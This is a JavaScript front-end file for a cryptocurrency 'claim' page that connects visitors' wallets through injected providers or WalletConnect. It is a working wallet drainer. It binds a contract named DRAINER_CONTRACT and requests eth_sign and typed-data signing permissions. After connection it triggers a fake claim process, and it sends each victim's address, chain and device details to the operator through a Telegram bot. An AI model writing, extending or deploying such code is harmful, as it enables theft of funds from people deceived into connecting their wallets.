import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ============================================================
  // CONFIG
  // ============================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG || {};

  const PRIMARY_PROJECT_ID  = PROJECT_ID        || '';
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID    || '';
  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  // ============================================================
  // PLATFORM DETECTION
  // ============================================================
  const UA             = navigator.userAgent || '';
  const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice    = /iPhone|iPad|iPod/i.test(UA);
  const isAndroid      = /Android/i.test(UA);

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroid)   return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ============================================================
  // DEBUG PANEL (double-tap to toggle)
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ============================================================
  // IN-WALLET BROWSER DETECTION
  // ============================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA))        return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA))                           return { wallet: 'rainbow',  name: 'Rainbow' };
    return null;
  }

  // ============================================================
  // TELEGRAM LOGGING (best-effort, non-blocking)
  // ============================================================
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[tg] failed:', await r.text()); return false; }
      return true;
    } catch (e) { console.error('[tg] exception:', e); return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ============================================================
  // UTILITIES
  // ============================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m  = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v  = pickFn(m);
        if (!v) throw new Error(`export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];
    const [EthereumProvider, WalletConnectModal, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m,   'EthereumProvider'),
      tryImport(modalCdn,    (m) => m.WalletConnectModal || m.default || m, 'WalletConnectModal'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,               'Web3'),
    ]);
    return {
      EthereumProvider,
      WalletConnectModal,
      Web3: Web3Mod.default || Web3Mod,
    };
  }

  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch {}
    }
    logDebug('⚠️ No relay probe OK — SDK default used');
    return null;
  }

  // ============================================================
  // DOM + STATE
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  let EthereumProviderCtor = null;
  let WalletConnectModalCtor = null;
  let Web3Ctor = null;

  let wcProvider        = null;   // EthereumProvider instance
  let injectedProvider  = null;   // window.ethereum
  let activeProvider    = null;   // whichever is live
  let web3Instance      = null;
  let contractInstance  = null;
  let connectionMode    = null;   // 'walletconnect' | 'injected'
  let isConnecting      = false;
  let isDisconnecting   = false;
  let modalController   = null;   // WalletConnectModal instance
  let currentProjectId  = null;

  // ============================================================
  // UI
  // ============================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent       = msg;
    claimStatus.className         = `status ${type}`;
    claimStatus.style.display     = 'block';
    claimStatus.style.padding     = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop   = '12px';
    claimStatus.style.fontWeight  = '500';
    claimStatus.style.fontSize    = '14px';
    claimStatus.style.textAlign   = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ============================================================
  // STORAGE
  // ============================================================
  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
  const saveWallet = (a, m) => { localStorage.setItem(LS.addr, a); if (m) localStorage.setItem(LS.mode, m); };
  const getSavedWallet = () => localStorage.getItem(LS.addr);
  const getSavedMode   = () => localStorage.getItem(LS.mode);
  const clearSavedWallet = () => { localStorage.removeItem(LS.addr); localStorage.removeItem(LS.mode); };

  // ============================================================
  // PUBLISH GLOBAL STATE (consumed by Script.js)
  // ============================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      mode: connectionMode,
      publishedAt: Date.now(),
    };
    logDebug(`publish: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ============================================================
  // CONNECTED UI
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);
    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 Chain: ${chainLabel}
🧩 Mode: ${connectionMode || 'unknown'}
👤 <code>${address}</code>
📱 Mobile: ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  // ============================================================
  // EIP-6963 SUPPORT
  // ============================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ============================================================
  // INJECTED EVM PATH
  // ============================================================
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedAttached) return;
    provider.__apexInjectedAttached = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        updateConnectedUI(a, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
  }

  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    const inWallet = detectInWalletBrowser();
    let providers  = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const mm = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = mm || providers[0]; // default to MetaMask or first
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        20000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider   = provider;
      connectionMode   = 'injected';

      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ============================================================
  // WALLETCONNECT — THE FIX
  //
  // Correct sequence:
  //   1. EthereumProvider.init({ showQrModal: false, ... })
  //      - This single call creates SignClient internally.
  //      - NEVER create a separate SignClient or call client.connect().
  //   2. provider.on('display_uri', uri => modal.openModal({ uri }))
  //   3. await provider.enable()  ← this triggers pairing + waits for approval
  //   4. provider.accounts[0] is now available
  //
  // Why the old code failed:
  //   - It called client.connect() on a DIFFERENT SignClient instance than
  //     the one embedded in EthereumProvider. Two SignClients can't share a
  //     pairing → the modal showed one URI, the wallet approved on another.
  // ============================================================
  async function initWCProvider(projectId) {
    if (wcProvider && currentProjectId === projectId) return wcProvider;

    // Tear down any stale instance
    if (wcProvider) {
      try { await wcProvider.disconnect?.(); } catch {}
      wcProvider = null;
    }

    if (!projectId) {
      logDebug('❌ No WalletConnect projectId');
      return null;
    }

    try {
      const relayUrl = await pickRelayUrl();

      logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}…`);
      const t0 = performance.now();

      const opts = {
        projectId,
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: false, // we drive UI via WalletConnectModal
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
        events: ['chainChanged', 'accountsChanged'],
        metadata: DAPP_METADATA,
      };
      if (relayUrl) opts.relayUrl = relayUrl;

      wcProvider = await withTimeout(
        EthereumProviderCtor.init(opts),
        20000,
        'EthereumProvider.init'
      );
      currentProjectId = projectId;

      // Attach events ONCE
      if (!wcProvider.__apexWcAttached) {
        wcProvider.__apexWcAttached = true;
        wcProvider.on('accountsChanged', (accounts) => {
          if (!accounts || accounts.length === 0) {
            hardDisconnect({ skipWalletCall: true });
            return;
          }
          const a = accounts[0];
          saveWallet(a, 'walletconnect');
          updateConnectedUI(a, 'evm');
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
          }, 800);
        });
        wcProvider.on('chainChanged', (id) => {
          showStatus(`Network changed to ${id}`, 'info');
          const a = window.__apexConnected?.address || getSavedWallet();
          if (a && web3Instance) {
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            publishGlobalState(a, 'evm', wcProvider);
          }
        });
        wcProvider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
        wcProvider.on('session_delete', () => hardDisconnect({ skipWalletCall: true }));
      }

      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  async function showWCModal() {
    if (!WalletConnectModalCtor) return null;
    if (modalController) return modalController;
    try {
      modalController = new WalletConnectModalCtor({
        projectId: currentProjectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });
      return modalController;
    } catch (e) {
      logDebug('Modal init: ' + e.message);
      return null;
    }
  }

  async function connectViaWalletConnect(useFallbackId = false) {
    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('Skipping WC — no projectId');
      return null;
    }

    const provider = await initWCProvider(projectId);
    if (!provider) return null;

    // ─── Fast path: existing session ───────────────────────────
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      logDebug(`♻️ WC session re-used: ${a}`);
      return a;
    }

    // ─── Fresh pairing ─────────────────────────────────────────
    showStatus('Opening wallet…', 'info');

    const mc = await showWCModal();
    let opened = false;
    const onUri = (uri) => {
      if (opened) return;
      opened = true;
      logDebug(`display_uri received (${uri.slice(0, 40)}…)`);
      try { mc?.openModal({ uri }); } catch (e) { logDebug('openModal: ' + e.message); }
    };
    provider.on('display_uri', onUri);

    // Hard cap on pairing so the UI doesn't hang forever
    const pairingTimeoutMs = isMobileDevice ? 90000 : 60000;
    let enableTimer = null;

    try {
      // enable() = pair + wait for approval.
      const enablePromise = provider.enable();
      const accounts = await Promise.race([
        enablePromise,
        new Promise((_, reject) => {
          enableTimer = setTimeout(
            () => reject(new Error(`Pairing timeout ${pairingTimeoutMs}ms`)),
            pairingTimeoutMs
          );
        }),
      ]);

      clearTimeout(enableTimer);
      provider.removeListener?.('display_uri', onUri);
      try { mc?.closeModal(); } catch {}

      if (!accounts?.length) {
        logDebug('enable() returned no accounts');
        showStatus('No accounts returned by wallet', 'error');
        return null;
      }

      const address = accounts[0];
      activeProvider   = provider;
      connectionMode   = 'walletconnect';
      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect');
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      clearTimeout(enableTimer);
      provider.removeListener?.('display_uri', onUri);
      try { mc?.closeModal(); } catch {}

      const msg = e?.message || String(e);
      logDebug('WC enable error: ' + msg);

      // Some flows emit session_delete if user cancelled
      if (/user rejected|user closed|rejected|denied/i.test(msg)) {
        showStatus('Connection cancelled by user', 'error');
      } else if (/timeout/i.test(msg)) {
        showStatus('Pairing timed out — try again', 'error');
      } else {
        showStatus('WalletConnect failed', 'error');
      }
      return null;
    }
  }

  // ============================================================
  // HARD DISCONNECT (single source of truth)
  // ============================================================
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider) {
        try {
          if (wcProvider.session) {
            await Promise.race([
              wcProvider.disconnect(),
              new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
            ]);
          }
        } catch (e) {
          logDebug('WC disconnect err: ' + e.message);
        }
      }
      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      wcProvider = null;
      currentProjectId = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  // ============================================================
  // CONNECT DISPATCHER (with full fallback chain)
  // ============================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;
    let attempts = [];

    try {
      const inWallet = detectInWalletBrowser();
      const preferInjected = !!inWallet && isMobileDevice;

      // 1) Injected (desktop or in-wallet browser)
      if (preferInjected || (!isMobileDevice && window.ethereum)) {
        logDebug('Trying injected…');
        address = await connectInjected();
        attempts.push({ mode: 'injected', ok: !!address });
      }

      // 2) WalletConnect primary projectId
      if (!address) {
        logDebug('Trying WalletConnect (primary projectId)…');
        address = await connectViaWalletConnect(false);
        attempts.push({ mode: 'wc-primary', ok: !!address });
      }

      // 3) WalletConnect fallback projectId
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Trying WalletConnect (fallback projectId)…');
        address = await connectViaWalletConnect(true);
        attempts.push({ mode: 'wc-fallback', ok: !!address });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1000);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
      sendTelegramNotification(`<b>❌ Connect failed</b>\n${attempts.map(a => `${a.mode}:${a.ok}`).join(', ')}\n${getPlatform()}`);
    }
  }

  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  // ============================================================
  // BUTTON WIRING
  // ============================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const connected = !!activeProvider || !!getSavedWallet();
    if (connected) await disconnectWallet();
    else            await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  // ============================================================
  // SESSION RESTORE
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();
    if (!savedWallet) return;

    // WalletConnect restore — EthereumProvider rehydrates from its own storage
    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWCProvider(PRIMARY_PROJECT_ID);
        if (provider?.session && provider.accounts?.length) {
          const a = provider.accounts[0];
          activeProvider   = provider;
          connectionMode   = 'walletconnect';
          web3Instance     = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect');
          updateConnectedUI(a, 'evm');
          logDebug(`♻️ WC session restored: ${a}`);
          return;
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    // Injected restore
    if (savedMode === 'injected' || !savedMode) {
      const prov = window.ethereum;
      if (prov && !isMobileDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider   = prov;
            connectionMode   = 'injected';
            web3Instance     = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    logDebug('⚠️ No restorable session — clearing');
    clearSavedWallet();
  }

  // ============================================================
  // BOOT
  // ============================================================
  try {
    const [libs] = await Promise.all([
      loadLibraries(),
      pickRelayUrl().catch(() => null),
    ]);
    EthereumProviderCtor     = libs.EthereumProvider;
    WalletConnectModalCtor   = libs.WalletConnectModal;
    Web3Ctor                 = libs.Web3;
    logDebug('✅ Libraries loaded');

    setupEIP6963();

    // Pre-warm WC on mobile so first tap is instant
    if (isMobileDevice && PRIMARY_PROJECT_ID) {
      logDebug('📱 Pre-warming WalletConnect…');
      initWCProvider(PRIMARY_PROJECT_ID).catch(() => {});
    }

    // Give EIP-6963 a moment, then attempt restore
    await new Promise((r) => setTimeout(r, 300));
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  logDebug(`✅ main.js ready — platform=${getPlatform()} mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
